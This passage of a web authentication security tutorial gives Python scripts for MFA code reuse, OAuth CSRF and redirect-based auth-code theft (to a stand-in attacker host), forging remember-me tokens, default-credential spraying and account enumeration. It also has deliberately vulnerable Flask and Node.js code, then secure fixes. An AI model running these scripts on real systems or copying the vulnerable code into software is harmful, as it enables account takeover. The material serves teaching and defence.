brute_force_otp(PRE_AUTH_SESS)
```

---

### 7c. MFA Code Reuse

```python
#!/usr/bin/env python3
"""
Test MFA Code Reuse — codes should be single-use and time-limited.
"""

import requests

TARGET_MFA   = "https://vulnerable-app.com/api/auth/mfa"
VALID_CODE   = "123456"    # A code you used legitimately (e.g., your own account)
OLD_SESSION  = "pre_auth_session_before_mfa"
NEW_SESSION  = "pre_auth_session_after_mfa"  # Fresh session needing MFA

# Test 1: Reuse code in new session
print("[*] Testing code reuse in new session...")
r = requests.post(
    TARGET_MFA,
    json={"otp": VALID_CODE},
    cookies={"pre_auth_session": NEW_SESSION}
)
print(f"[*] Reuse attempt 1: {r.status_code} — {r.text[:200]}")

# Test 2: Reuse code after time delay
import time
print("\n[*] Waiting 35 seconds then retrying...")
time.sleep(35)
r2 = requests.post(
    TARGET_MFA,
    json={"otp": VALID_CODE},
    cookies={"pre_auth_session": OLD_SESSION}
)
print(f"[*] Reuse attempt 2 (35s later): {r2.status_code} — {r2.text[:200]}")
if r2.status_code == 200:
    print("[!] CODE REUSE VULNERABILITY CONFIRMED")
```

---

## Scenario 8: OAuth 2.0 Authentication Flaws

### OAuth Flow Overview

```mermaid
sequenceDiagram
    participant U as User
    participant C as Client App
    participant AS as Auth Server (Google/GitHub)
    participant RS as Resource Server

    U->>C: Click "Login with Google"
    C->>AS: Redirect with client_id, redirect_uri, state=RANDOM
    AS->>U: Show consent screen
    U->>AS: Grant permission
    AS->>C: Redirect back with code=AUTH_CODE&state=RANDOM
    C->>C: Verify state parameter
    C->>AS: Exchange code for access_token
    AS-->>C: access_token + id_token
    C->>RS: Request user data with access_token
    RS-->>C: User profile
    C->>U: Logged in!
```

### 8a. Missing State Parameter (CSRF on OAuth)

```python
#!/usr/bin/env python3
"""
OAuth CSRF — Missing or unvalidated state parameter.
Attacker tricks victim's browser into completing OAuth with attacker's code.
"""

# Attacker steps:
# 1. Start OAuth flow — get the authorization URL
# 2. Stop BEFORE granting permission (get attacker's auth code)
# 3. Trick victim into visiting the callback URL with attacker's code
# 4. Victim's session gets linked to attacker's social account

CALLBACK_URL = "https://vulnerable-app.com/auth/callback"
ATTACKER_CODE = "4/P7q7W91a-oMsCeLvIaQm6bTrgtp7"  # Attacker's auth code

# Craft the CSRF URL (no state parameter verification)
csrf_url = f"{CALLBACK_URL}?code={ATTACKER_CODE}"
print(f"[*] CSRF Payload URL:")
print(f"    {csrf_url}")
print(f"\n[*] Deliver via:")
print(f"    <img src='{csrf_url}'>")
print(f"    <iframe src='{csrf_url}' hidden></iframe>")
print(f"    window.location = '{csrf_url}'")
print(f"\n[*] If victim is logged in, their account links to attacker's social account")
print(f"[*] Attacker can then login with their own Google/GitHub to access victim's account")
```

---

### 8b. OAuth Open Redirect — Token Leakage

```python
#!/usr/bin/env python3
"""
OAuth Open Redirect — Steal authorization codes via redirect_uri manipulation.
"""

import urllib.parse

AUTH_SERVER   = "https://accounts.google.com/o/oauth2/auth"
CLIENT_ID     = "1234567890-abc.apps.googleusercontent.com"
LEGIT_REDIRECT = "https://vulnerable-app.com/auth/callback"
ATTACKER_HOST  = "https://evil.attacker.com"

# Technique 1: Redirect to attacker domain
payload_1 = {
    "client_id": CLIENT_ID,
    "redirect_uri": ATTACKER_HOST,
    "response_type": "code",
    "scope": "openid email profile"
}

# Technique 2: Open redirect on the client app
# If vulnerable-app.com has an open redirect at /redirect?url=
open_redirect_payload = {
    "client_id": CLIENT_ID,
    "redirect_uri": f"https://vulnerable-app.com/redirect?url={ATTACKER_HOST}",
    "response_type": "code",
    "scope": "openid email profile"
}

# Technique 3: Path traversal in redirect_uri
path_traversal_payload = {
    "client_id": CLIENT_ID,
    "redirect_uri": f"https://vulnerable-app.com/auth/callback/../../../evil",
    "response_type": "code",
    "scope": "openid email profile"
}

print("[*] OAuth Token Leakage Payloads:")
for name, params in [
    ("Direct attacker redirect", payload_1),
    ("Via open redirect", open_redirect_payload),
    ("Path traversal", path_traversal_payload)
]:
    url = f"{AUTH_SERVER}?{urllib.parse.urlencode(params)}"
    print(f"\n  [{name}]")
    print(f"  {url}")
```

---

## Scenario 9: Insecure "Remember Me" Tokens

### Remember Me Attack Flow

```mermaid
graph TD
    A[User checks Remember Me] --> B[Server generates token]
    B --> C{Token type?}
    C -->|username:timestamp base64| D[Predictable — forge for any user]
    C -->|MD5 of user data| E[Brute forceable]
    C -->|Sequential integer| F[Enumerate other users]
    C -->|Cryptographically random 256-bit| G[Secure]
    D --> H[Attacker forges token for admin]
    E --> H
    F --> H
    H --> I[Persistent Account Takeover]
    I --> J[Survives password changes if not invalidated]

    style G fill:#2ecc71,stroke:#27ae60,color:#fff
    style I fill:#c0392b,stroke:#922b21,color:#fff
```

```python
#!/usr/bin/env python3
"""
Remember Me Token Forgery
Tests for weak persistent token implementation.
"""

import base64
import hashlib
import requests
import time
import itertools

TARGET_URL = "https://vulnerable-app.com/api/dashboard"

def test_base64_token(username):
    """Test if remember me token is just base64(username:timestamp)."""
    print(f"[*] Testing base64 token forgery for: {username}")
    now = int(time.time())

    for offset in range(0, 3600 * 24, 60):  # Last 24 hours, per minute
        ts = now - offset
        # Common patterns
        candidates = [
            base64.b64encode(f"{username}:{ts}".encode()).decode(),
            base64.b64encode(f"{username}".encode()).decode(),
            base64.b64encode(f"remember:{username}:{ts}".encode()).decode(),
        ]
        for token in candidates:
            r = requests.get(
                TARGET_URL,
                cookies={"remember_me": token},
                allow_redirects=False
            )
            if r.status_code == 200:
                print(f"[+] VALID token: {token}")
                return token
    return None

def test_md5_token(username):
    """Test if remember me token is MD5-based."""
    print(f"[*] Testing MD5 token forgery for: {username}")
    now = int(time.time())

    for offset in range(0, 3600):
        ts = now - offset
        candidates = [
            hashlib.md5(f"{username}{ts}".encode()).hexdigest(),
            hashlib.md5(f"{username}".encode()).hexdigest(),
            hashlib.md5(f"{username}:remember".encode()).hexdigest(),
        ]
        for token in candidates:
            r = requests.get(
                TARGET_URL,
                cookies={"remember_me": token},
                allow_redirects=False
            )
            if r.status_code == 200:
                print(f"[+] VALID MD5 token: {token}")
                return token
    return None

def test_sequential_token(known_token_value):
    """Test if remember me tokens are sequential integers."""
    print(f"[*] Testing sequential token enumeration...")
    base = int(known_token_value)

    for i in range(base - 100, base + 100):
        r = requests.get(
            TARGET_URL,
            cookies={"remember_me": str(i)},
            allow_redirects=False
        )
        if r.status_code == 200:
            print(f"[+] VALID sequential token: {i}")

if __name__ == "__main__":
    test_base64_token("admin")
    test_md5_token("admin")
    test_sequential_token("1042")
```

---

## Scenario 10: Default Credentials

Many applications, routers, IoT devices, and admin panels ship with well-known default credentials that are never changed.

```python
#!/usr/bin/env python3
"""
Default Credentials Tester
Tests common default username/password combinations.
"""

import requests
import json

TARGET_URL = "https://vulnerable-app.com/api/login"

DEFAULT_CREDS = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "admin123"),
    ("admin", "123456"),
    ("admin", ""),
    ("administrator", "administrator"),
    ("administrator", "password"),
    ("root", "root"),
    ("root", "toor"),
    ("root", "password"),
    ("user", "user"),
    ("user", "password"),
    ("guest", "guest"),
    ("test", "test"),
    ("demo", "demo"),
    ("admin", "letmein"),
    ("admin", "welcome"),
    ("admin", "changeme"),
    ("admin", "default"),
    ("admin", "1234"),
    ("admin", "12345678"),
    ("sa", ""),           # MSSQL default
    ("postgres", "postgres"),
    ("mysql", "mysql"),
    ("oracle", "oracle"),
    ("tomcat", "tomcat"),
    ("manager", "manager"),
    ("jenkins", "jenkins"),
    ("admin", "jenkins"),
    ("kibana", "kibana"),
    ("elastic", "changeme"),
    ("grafana", "admin"),
]

print(f"[*] Testing {len(DEFAULT_CREDS)} default credential pairs...")
print(f"[*] Target: {TARGET_URL}\n")

for username, password in DEFAULT_CREDS:
    try:
        r = requests.post(
            TARGET_URL,
            json={"username": username, "password": password},
            timeout=10,
            allow_redirects=False
        )
        if r.status_code in [200, 302] and "invalid" not in r.text.lower():
            print(f"[+] VALID: {username}:{password} | Status: {r.status_code}")
            print(f"    Response: {r.text[:100]}")
        else:
            print(f"[-] Invalid: {username}:{password}", end="\r")
    except Exception as e:
        print(f"[!] Error for {username}:{password}: {e}")
```

---

## Scenario 11: Account Enumeration

The application reveals whether a username/email exists based on different error messages.

```mermaid
graph LR
    A[POST /login] --> B{Username exists?}
    B -->|No| C["Response: 'User not found'"]
    B -->|Yes, wrong pass| D["Response: 'Invalid password'"]
    C --> E[Attacker knows user does NOT exist]
    D --> F[Attacker knows user EXISTS]
    F --> G[Targeted brute force on valid accounts]
    G --> H[Account Takeover]

    style C fill:#2ecc71,stroke:#27ae60,color:#fff
    style D fill:#e74c3c,stroke:#c0392b,color:#fff
    style H fill:#c0392b,stroke:#922b21,color:#fff
```

```python
#!/usr/bin/env python3
"""
Account Enumeration via Different Error Messages
"""

import requests
import sys

TARGET_LOGIN  = "https://vulnerable-app.com/api/login"
TARGET_FORGOT = "https://vulnerable-app.com/api/forgot-password"
USERLIST      = "usernames.txt"

VALID_INDICATORS = [
    "invalid password",
    "wrong password",
    "incorrect password",
    "password does not match",
    "email exists",
    "check your email",
]

INVALID_INDICATORS = [
    "user not found",
    "no account",
    "email not found",
    "account does not exist",
]

def enumerate_via_login(userlist):
    """Enumerate users via login error message differences."""
    valid_users = []
    with open(userlist) as f:
        users = [l.strip() for l in f if l.strip()]

    print(f"[*] Enumerating {len(users)} usernames via login endpoint...")

    for user in users:
        r = requests.post(
            TARGET_LOGIN,
            json={"username": user, "password": "INVALID_PASSWORD_XYZ_9999"},
            timeout=10
        )
        resp = r.text.lower()

        is_valid = any(ind in resp for ind in VALID_INDICATORS)
        is_invalid = any(ind in resp for ind in INVALID_INDICATORS)

        if is_valid:
            print(f"[+] VALID USER: {user} | Response: {r.text[:80]}")
            valid_users.append(user)
        elif is_invalid:
            print(f"[-] Invalid: {user}", end="\r")

    return valid_users

def enumerate_via_timing(userlist):
    """Enumerate users via response time differences."""
    import time
    valid_users = []

    with open(userlist) as f:
        users = [l.strip() for l in f if l.strip()]

    print(f"\n[*] Enumerating via timing analysis...")

    for user in users:
        start = time.time()
        r = requests.post(
            TARGET_LOGIN,
            json={"username": user, "password": "WrongPassword!123"},
            timeout=10
        )
        elapsed = time.time() - start

        # Valid users often take longer (bcrypt hash comparison)
        if elapsed > 0.5:
            print(f"[+] POSSIBLE VALID USER (slow response: {elapsed:.2f}s): {user}")
            valid_users.append(user)
        else:
            print(f"[-] {user} ({elapsed:.2f}s)", end="\r")

    return valid_users

def enumerate_via_forgot_password(userlist):
    """Enumerate users via password reset endpoint."""
    valid_users = []

    with open(userlist) as f:
        users = [l.strip() for l in f if l.strip()]

    print(f"\n[*] Enumerating via forgot-password endpoint...")

    for user in users:
        r = requests.post(
            TARGET_FORGOT,
            json={"email": user},
            timeout=10
        )
        resp = r.text.lower()

        if any(ind in resp for ind in ["email sent", "check your inbox", "reset link"]):
            print(f"[+] VALID EMAIL: {user}")
            valid_users.append(user)
        elif any(ind in resp for ind in ["not found", "no account"]):
            print(f"[-] Not found: {user}", end="\r")

    return valid_users

if __name__ == "__main__":
    valid = enumerate_via_login(USERLIST)
    valid += enumerate_via_forgot_password(USERLIST)
    valid += enumerate_via_timing(USERLIST)

    print(f"\n[*] Total valid accounts found: {len(set(valid))}")
    for u in set(valid):
        print(f"    {u}")
```

---

## Vulnerable Code Examples

### Python (Flask) — Multiple Auth Vulnerabilities

```python
from flask import Flask, request, jsonify, session
import hashlib
import os
import sqlite3
import time

app = Flask(__name__)
app.secret_key = "secret"  # VULNERABLE: Hardcoded weak secret key

# VULNERABLE: MD5 password hashing (use bcrypt/argon2 instead)
def hash_password(password):
    return hashlib.md5(password.encode()).hexdigest()

# VULNERABLE: No rate limiting, no lockout, weak hashing, user enumeration
@app.route('/api/login', methods=['POST'])
def login():
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')

    conn = sqlite3.connect('users.db')
    user = conn.execute(
        "SELECT * FROM users WHERE username = ?", (username,)
    ).fetchone()
    conn.close()

    # VULNERABLE: Different messages reveal if user exists (enumeration)
    if not user:
        return jsonify({"error": "User not found"}), 401   # Reveals user doesn't exist

    if user['password'] != hash_password(password):
        return jsonify({"error": "Invalid password"}), 401  # Reveals user exists

    # VULNERABLE: Session ID is predictable (username + timestamp)
    session_id = hashlib.md5(f"{username}{int(time.time())}".encode()).hexdigest()
    session['user'] = username
    session['session_id'] = session_id

    # VULNERABLE: No session regeneration after login (session fixation risk)
    return jsonify({
        "message": "Login successful",
        "session_id": session_id   # VULNERABLE: Token exposed in response body
    })

# VULNERABLE: Weak password reset token
@app.route('/api/forgot-password', methods=['POST'])
def forgot_password():
    email = request.get_json().get('email')

    conn = sqlite3.connect('users.db')
    user = conn.execute("SELECT * FROM users WHERE email = ?", (email,)).fetchone()

    if not user:
        # VULNERABLE: Reveals whether email is registered
        return jsonify({"error": "Email not found in our system"}), 404

    # VULNERABLE: Predictable MD5 token
    token = hashlib.md5(f"{email}{int(time.time())}".encode()).hexdigest()[:8]

    # VULNERABLE: Token sent in HTTP response (not just via email)
    return jsonify({
        "message": "Reset email sent",
        "debug_token": token   # NEVER do this in production!
    })

# VULNERABLE: No expiry check on reset tokens
@app.route('/api/reset-password', methods=['POST'])
def reset_password():
    data  = request.get_json()
    token = data.get('token')
    new_pw = data.get('password')

    conn = sqlite3.connect('users.db')
    user = conn.execute(
        "SELECT * FROM users WHERE reset_token = ?", (token,)
    ).fetchone()

    if not user:
        return jsonify({"error": "Invalid token"}), 400

    # VULNERABLE: Token never expires, never invalidated after use
    # VULNERABLE: No password complexity enforcement
    conn.execute(
        "UPDATE users SET password = ? WHERE id = ?",
        (hash_password(new_pw), user['id'])
    )
    conn.commit()
    return jsonify({"message": "Password reset successful"})

if __name__ == '__main__':
    app.run(debug=True)  # VULNERABLE: debug=True in production
```

---

### Node.js — Vulnerable JWT Implementation

```javascript
const express = require('express');
const jwt = require('jsonwebtoken');
const app = express();

app.use(express.json());

const WEAK_SECRET = "secret123";  // VULNERABLE: Weak, hardcoded secret

// VULNERABLE: Accepts 'none' algorithm, no algorithm pinning
app.post('/api/login', (req, res) => {
  const { username, password } = req.body;

  // Simplified — no real DB check
  if (username === 'admin' && password === 'password') {
    const token = jwt.sign(
      { sub: username, role: 'user' },
      WEAK_SECRET
      // VULNERABLE: No expiry (exp) set
    );
    res.json({ token });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

// VULNERABLE: Does not pin algorithm, accepts 'none'
app.get('/api/admin', (req, res) => {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'No token' });

  try {
    // VULNERABLE: No algorithms option — accepts 'none', RS256->HS256 confusion
    const decoded = jwt.verify(token, WEAK_SECRET);

    if (decoded.role !== 'admin') {
      return res.status(403).json({ error: 'Not admin' });
    }
    res.json({ message: 'Welcome admin', data: decoded });
  } catch (err) {
    res.status(401).json({ error: 'Invalid token' });
  }
});

// VULNERABLE: No rate limiting on any endpoint
app.post('/api/mfa/verify', (req, res) => {
  const { otp } = req.body;
  const session = req.cookies.pre_auth;

  // VULNERABLE: OTP brute-forceable with no lockout
  if (otp === '123456') {  // Hardcoded for demo
    res.json({ success: true, message: 'MFA verified' });
  } else {
    res.json({ success: false, message: 'Invalid OTP' });
  }
});

app.listen(3000);
```

---

## Mitigation & Prevention

### 1. Secure Password Hashing

```python
import bcrypt
import argon2
from argon2 import PasswordHasher

# Method 1: bcrypt (recommended)
def hash_password_bcrypt(password: str) -> str:
    salt = bcrypt.gensalt(rounds=12)  # Cost factor 12
    return bcrypt.hashpw(password.encode(), salt).decode()

def verify_password_bcrypt(password: str, hashed: str) -> bool:
    return bcrypt.checkpw(password.encode(), hashed.encode())

# Method 2: Argon2id (most recommended — winner of Password Hashing Competition)
ph = PasswordHasher(
    time_cost=3,        # Number of iterations
    memory_cost=65536,  # 64 MB memory
    parallelism=2,      # Number of threads
    hash_len=32,
    salt_len=16
)

def hash_password_argon2(password: str) -> str:
    return ph.hash(password)

def verify_password_argon2(password: str, hashed: str) -> bool:
    try:
        return ph.verify(hashed, password)
    except argon2.exceptions.VerifyMismatchError:
        return False

# Usage example
hashed = hash_password_argon2("MySecurePassword123!")
print(f"[*] Argon2id hash: {hashed}")
print(f"[*] Verify correct: {verify_password_argon2('MySecurePassword123!', hashed)}")
print(f"[*] Verify wrong:   {verify_password_argon2('wrongpassword', hashed)}")
```

---

### 2. Secure Session Management

```python
import os
import secrets
import time
from flask import Flask, request, jsonify, session
from functools import wraps

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)  # Cryptographically random secret
app.config.update(
    SESSION_COOKIE_HTTPONLY=True,   # Prevent JS access
    SESSION_COOKIE_SECURE=True,     # HTTPS only
    SESSION_COOKIE_SAMESITE='Lax',  # CSRF protection
    PERMANENT_SESSION_LIFETIME=1800  # 30 minute timeout
)

# Secure session store
sessions = {}

def generate_session_token():
    """Generate a cryptographically secure session token."""
    return secrets.token_urlsafe(64)  # 512 bits of entropy

def create_session(user_id, user_data):
    """Create a secure server-side session."""
    token = generate_session_token()
    sessions[token] = {
        "user_id": user_id,
        "data": user_data,
        "created_at": time.time(),
        "last_activity": time.time(),
        "ip": request.remote_addr,
        "user_agent": request.user_agent.string
    }
    return token

def get_session(token):
    """Retrieve and validate session."""
    sess = sessions.get(token)
    if not sess:
        return None

    # Check session timeout (30 minutes)
    if time.time() - sess["last_activity"] > 1800:
        del sessions[token]
        return None

    # Optional: IP binding
    # if sess["ip"] != request.remote_addr:
    #     return None

    sess["last_activity"] = time.time()
    return sess

def invalidate_session(token):
    """Properly destroy a session."""
    sessions.pop(token, None)

def require_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.cookies.get("session")
        if not token or not get_session(token):
            return jsonify({"error": "Unauthorized"}), 401
        return f(*args, **kwargs)
    return decorated

@app.route('/api/login', methods=['POST'])
def secure_login():
    data = request.get_json()
    # ... validate credentials with bcrypt/argon2 ...

    # SECURE: Regenerate session ID after login (prevents session fixation)
    old_token = request.cookies.get("session")
    if old_token:
        invalidate_session(old_token)

    # Create new session
    new_token = create_session(user_id=1, user_data={"role": "user"})

    resp = jsonify({"message": "Login successful"})
    resp.set_cookie(
        "session",
        new_token,
        httponly=True,    # No JS access
        secure=True,      # HTTPS only
        samesite="Lax",   # CSRF protection
        max_age=1800       # 30 min
    )
    return resp

@app.route('/api/logout', methods=['POST'])
def logout():
    token = request.cookies.get("session")
    invalidate_session(token)
    resp = jsonify({"message": "Logged out"})
    resp.delete_cookie("session")
    return resp
```

---

### 3. Rate Limiting & Account Lockout

```python
import time
import redis
from flask import Flask, request, jsonify
from functools import wraps

app = Flask(__name__)
r = redis.Redis(host='localhost', port=6379, db=0)

# Configuration
MAX_ATTEMPTS     = 5      # Max failed attempts before lockout
LOCKOUT_DURATION = 900    # 15 minute lockout
RATE_WINDOW      = 60     # 1 minute window
RATE_MAX_REQS    = 10     # Max 10 requests per minute

def rate_limit(key_prefix, max_requests, window_seconds):
    """Sliding window rate limiter using Redis."""
    def decorator(f):
        @wraps(f)
        def wrapper(*args, **kwargs):
            ip = request.remote_addr
            key = f"{key_prefix}:{ip}"
            now = time.time()
            window_start = now - window_seconds

            pipe = r.pipeline()
            pipe.zremrangebyscore(key, 0, window_start)
            pipe.zadd(key, {str(now): now})
            pipe.zcard(key)
            pipe.expire(key, window_seconds)
            results = pipe.execute()

            request_count = results[2]
            if request_count > max_requests:
                return jsonify({
                    "error": "Too many requests",
                    "retry_after": window_seconds
                }), 429
            return f(*args, **kwargs)
        return wrapper
    return decorator

def check_account_lockout(username):
    """Check if account is locked out."""
    key = f"lockout:{username}"
    lockout_time = r.get(key)
    if lockout_time:
        remaining = float(lockout_time) - time.time()
        if remaining > 0:
            return True, int(remaining)
    return False, 0

def record_failed_attempt(username):
    """Record a failed login attempt and lock if threshold exceeded."""
    key = f"failed:{username}"
    attempts = r.incr(key)
    r.expire(key, LOCKOUT_DURATION)

    if attempts >= MAX_ATTEMPTS:
        lockout_key = f"lockout:{username}"
        r.setex(lockout_key, LOCKOUT_DURATION, str(time.time() + LOCKOUT_DURATION))
        return True  # Account locked
    return False

def clear_failed_attempts(username):
    """Clear failed attempts after successful login."""
    r.delete(f"failed:{username}")
    r.delete(f"lockout:{username}")

@app.route('/api/login', methods=['POST'])
@rate_limit("login", RATE_MAX_REQS, RATE_WINDOW)
def secure_login():
    data = request.get_json()
    username = data.get('username', '').strip()
    password = data.get('password', '')

    # Check lockout BEFORE processing
    locked, remaining = check_account_lockout(username)
    if locked:
        return jsonify({
            "error": f"Account temporarily locked. Try again in {remaining} seconds."
        }), 429

    # Validate credentials (using bcrypt/argon2)
    user = get_user_from_db(username)

    # Use constant-time comparison and always hash (prevent timing attacks)
    if user and verify_password(password, user['password_hash']):
        clear_failed_attempts(username)
        token = create_session(user['id'], user)
        resp = jsonify({"message": "Login successful"})
        resp.set_cookie("session", token, httponly=True, secure=True, samesite="Lax")
        return resp
    else:
        # Record failure — same response regardless of username validity
        if user:
            record_failed_attempt(username)
        # SECURE: Same error message whether user exists or not
        return jsonify({"error": "Invalid username or password"}), 401

def get_user_from_db(username):
    pass  # DB lookup implementation

def verify_password(plain, hashed):
    pass  # bcrypt.checkpw implementation
```

---

### 4. Secure JWT Implementation

```python
import jwt
import secrets
import time
from flask import Flask, request, jsonify
from functools import wraps

app = Flask(__name__)

# SECURE: Strong random secret, loaded from environment
JWT_SECRET    = secrets.token_hex(64)  # 512-bit secret
JWT_ALGORITHM = "HS256"               # Pin the algorithm
JWT_EXPIRY    = 3600                   # 1 hour

BLACKLISTED_TOKENS = set()  # In production, use Redis

def generate_jwt(user_id, role):
    """Generate a secure JWT with pinned algorithm and expiry."""
    now = int(time.time())
    payload = {
        "sub": str(user_id),
        "role": role,
        "iat": now,
        "exp": now + JWT_EXPIRY,
        "jti": secrets.token_hex(16)  # Unique token ID for revocation
    }
    return jwt.encode(payload, JWT_SECRET, algorithm=JWT_ALGORITHM)

def verify_jwt(token):
    """Verify JWT with strict algorithm pinning."""
    try:
        payload = jwt.decode(
            token,
            JWT_SECRET,
            algorithms=[JWT_ALGORITHM],  # SECURE: Allowlist of algorithms only
            options={
                "require": ["exp", "iat", "sub", "jti"],  # Required claims
                "verify_exp": True
            }
        )
        # Check revocation list
        if payload.get("jti") in BLACKLISTED_TOKENS:
            return None
        return payload
    except jwt.ExpiredSignatureError:
        return None
    except jwt.InvalidAlgorithmError:
        return None
    except jwt.DecodeError:
        return None
    except Exception:
        return None

def require_jwt(roles=None):
    def decorator(f):
        @wraps(f)
        def wrapper(*args, **kwargs):
            auth = request.headers.get("Authorization", "")
            if not auth.startswith("Bearer "):
                return jsonify({"error": "Missing token"}), 401
            token = auth.split(" ", 1)[1]
            payload = verify_jwt(token)
            if not payload:
                return jsonify({"error": "Invalid or expired token"}), 401
            if roles and payload.get("role") not in roles:
                return jsonify({"error": "Insufficient privileges"}), 403
            request.current_user = payload
            return f(*args, **kwargs)
        return wrapper
    return decorator

@app.route('/api/login', methods=['POST'])
def login():
    # ... validate credentials ...
    token = generate_jwt(user_id=1, role="user")
    return jsonify({"token": token})

@app.route('/api/logout', methods=['POST'])
@require_jwt()
def logout():
    """Revoke the JWT by adding it to the blacklist."""
    jti = request.current_user.get("jti")
    BLACKLISTED_TOKENS.add(jti)
    return jsonify({"message": "Logged out successfully"})

@app.route('/api/admin', methods=['GET'])
@require_jwt(roles=["admin"])
def admin_panel():
    return jsonify({"message": f"Welcome admin {request.current_user['sub']}"})
```

---

### 5. Secure Password Reset

```python
import secrets
import time
import hashlib
import redis

r = redis.Redis(host='localhost', port=6379, db=1)

RESET_TOKEN_EXPIRY = 900   # 15 minutes
RESET_TOKEN_BYTES  = 32    # 256 bits of entropy

def generate_reset_token(user_id: int, email: str) -> str:
    """Generate a cryptographically secure, single-use reset token."""
    token = secrets.token_urlsafe(RESET_TOKEN_BYTES)
    token_hash = hashlib.sha256(token.encode()).hexdigest()

    # Store hash in Redis (not the token itself) with expiry
    key = f"reset:{token_hash}"
    r.setex(key, RESET_TOKEN_EXPIRY, str(user_id))

    # Invalidate any existing reset token for this user
    existing_key = f"reset_user:{user_id}"
    old_hash = r.get(existing_key)
    if old_hash:
        r.delete(f"reset:{old_hash.decode()}")
    r.setex(existing_key, RESET_TOKEN_EXPIRY, token_hash)

    return token  # Send this token in the email (not the hash)

def validate_reset_token(token: str) -> tuple:
    """Validate reset token — returns (user_id, is_valid)."""
    token_hash = hashlib.sha256(token.encode()).hexdigest()
    key = f"reset:{token_hash}"
    user_id = r.get(key)

    if not user_id:
        return None, False

    # Single-use: Delete immediately after validation
    r.delete(key)
    r.delete(f"reset_user:{user_id.decode()}")

    return int(user_id), True

def safe_reset_email_response(email_exists: bool):
    """
    Return the SAME response regardless of whether the email exists.
    Prevents email enumeration.
    """
    return {"message": "If that email is registered, you will receive a reset link."}

# Flask route
from flask import Flask, request, jsonify
app = Flask(__name__)

@app.route('/api/forgot-password', methods=['POST'])
def forgot_password():
    email = request.get_json().get('email', '').strip().lower()

    user = get_user_by_email(email)  # Your DB lookup

    if user:
        token = generate_reset_token(user['id'], email)
        # Build reset URL using hardcoded domain — not from Host header!
        reset_url = f"https://app.company.com/reset-password?token={token}"
        send_reset_email(email, reset_url)

    # SECURE: Same response whether email exists or not
    return jsonify(safe_reset_email_response(user is not None))

@app.route('/api/reset-password', methods=['POST'])
def reset_password():
    data  = request.get_json()
    token = data.get('token', '')
    new_pw = data.get('password', '')

    # Validate password strength
    if len(new_pw) < 12:
        return jsonify({"error": "Password must be at least 12 characters"}), 400

    user_id, valid = validate_reset_token(token)
    if not valid:
        return jsonify({"error": "Invalid or expired reset token"}), 400

    # Hash and update password
    new_hash = hash_password_argon2(new_pw)
    update_password_in_db(user_id, new_hash)

    # Invalidate all existing sessions
    invalidate_all_user_sessions(user_id)

    return jsonify({"message": "Password reset successfully"})

def get_user_by_email(email): pass
def send_reset_email(email, url): pass
def hash_password_argon2(pw): pass
def update_password_in_db(uid, hash): pass
def invalidate_all_user_sessions(uid): pass
```

---

### 6. Secure MFA Implementation

```python
import pyotp
import secrets
import time
import redis

r = redis.Redis(host='localhost', port=6379, db=2)

MFA_WINDOW        = 1     # Allow 1 step before/after for clock skew
OTP_RATE_LIMIT    = 5     # Max OTP attempts
OTP_LOCKOUT       = 300   # 5 minute lockout

def generate_totp_secret(user_id: int) -> str:
    """Generate a TOTP secret for a user."""
    secret = pyotp.random_base32()
    # Store securely (encrypted in production)
    r.set(f"totp_secret:{user_id}", secret)
    return secret

def get_totp_uri(secret: str, email: str, issuer: str = "MyApp") -> str:
    """Generate TOTP URI for QR code display."""
    totp = pyotp.TOTP(secret)
    return totp.provisioning_uri(name=email, issuer_name=issuer)

def verify_totp(user_id: int, code: str) -> tuple:
    """
    Verify TOTP code with:
    - Rate limiting
    - Single-use enforcement (prevents replay)
    - Clock skew tolerance
    """
    # Rate limit check
    rate_key = f"mfa_attempts:{user_id}"
    attempts = r.incr(rate_key)
    r.expire(rate_key, OTP_LOCKOUT)

    if attempts > OTP_RATE_LIMIT:
        return False, "Too many attempts. Try again in 5 minutes."

    # Get secret
    secret_bytes = r.get(f"totp_secret:{user_id}")
    if not secret_bytes:
        return False, "MFA not configured"

    secret = secret_bytes.decode()
    totp = pyotp.TOTP(secret)

    # Verify with clock skew tolerance
    if not totp.verify(code, valid_window=MFA_WINDOW):
        return False, "Invalid OTP code"

    # Single-use: Check if this code was already used
    used_key = f"mfa_used:{user_id}:{code}"
    if r.exists(used_key):
        return False, "OTP code already used"

    # Mark code as used (expires after TOTP window — 90 seconds)
    r.setex(used_key, 90, "1")

    # Clear rate limit on success
    r.delete(rate_key)
    return True, "Success"

# Flask MFA routes
from flask import Flask, request, jsonify
app = Flask(__name__)

@app.route('/api/mfa/setup', methods=['POST'])
def setup_mfa():
    user_id = request.current_user['sub']  # From JWT
    email   = request.current_user['email']

    secret  = generate_totp_secret(user_id)
    uri     = get_totp_uri(secret, email)

    return jsonify({
        "secret": secret,
        "qr_uri": uri,
        "message": "Scan QR code with authenticator app"
    })

@app.route('/api/mfa/verify', methods=['POST'])
def verify_mfa():
    code = request.get_json().get('code', '').strip()
    pre_auth_token = request.cookies.get('pre_auth_session')

    user_id = get_pre_auth_user(pre_auth_token)
    if not user_id:
        return jsonify({"error": "Invalid session"}), 401

    valid, message = verify_totp(user_id, code)
    if not valid:
        return jsonify({"error": message}), 401

    # MFA passed — issue full session token
    full_token = generate_jwt(user_id, role="user")
    resp = jsonify({"message": "MFA verified"})
    resp.set_cookie("session", full_token, httponly=True, secure=True, samesite="Lax")
    # Invalidate pre-auth cookie
    resp.delete_cookie("pre_auth_session")
    return resp

def get_pre_auth_user(token): pass
def generate_jwt(uid, role): pass
```

---

### Defense-in-Depth Checklist

- [x] Use Argon2id or bcrypt with cost factor >= 12 for password hashing
- [x] Enforce strong password policy (min 12 chars, complexity)
- [x] Implement account lockout after 5 failed attempts with 15-minute cooldown
- [x] Apply rate limiting on all authentication endpoints (login, reset, MFA)
- [x] Regenerate session ID after every successful login (prevent fixation)
- [x] Use cryptographically random session tokens (min 256 bits)
- [x] Set `HttpOnly`, `Secure`, and `SameSite=Lax` flags on session cookies
- [x] Implement session timeout (idle and absolute)
- [x] Return identical error messages regardless of username validity
- [x] Use constant-time string comparison for credentials/tokens
- [x] Generate password reset tokens with `secrets.token_urlsafe(32)` min
- [x] Set reset tokens to expire in 15 minutes and be single-use only
- [x] Never use `Host` header to build reset URLs — hardcode the domain
- [x] Pin JWT algorithm server-side (never accept `none` or unexpected algorithms)
- [x] Set `exp`, `iat`, and `jti` claims in all JWTs
